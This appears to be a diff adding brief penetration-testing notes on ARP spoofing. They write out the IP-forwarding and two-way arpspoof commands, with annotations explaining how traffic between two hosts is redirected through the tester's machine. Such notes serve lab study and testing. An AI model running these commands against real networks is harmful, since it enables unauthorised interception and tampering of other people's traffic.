@@ -1,0 +1,20 @@
+ARP-SPOOF
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i tap0 -t 10.185.11.1 -r 10.185.10.34
+
+arpspoof -i tap0 -t 10.185.10.34 -r 10.185.11.1
+
+=================
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward  <--enable ip forwarding first
+
+arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.23  <---this will tell 172.16.5.1 that if they need to communicate with 172.16.5.23 they must pass from the pentester system
+
+now, in a separate terminal, 
+
+arpspoof -i tap0 -t 172.16.5.23 -r 172.16.5.1 <---this will tell 172.16.5.23 that if the need to communicate with 172.16.5.1 they must pass 
+
+from the pentester system
+
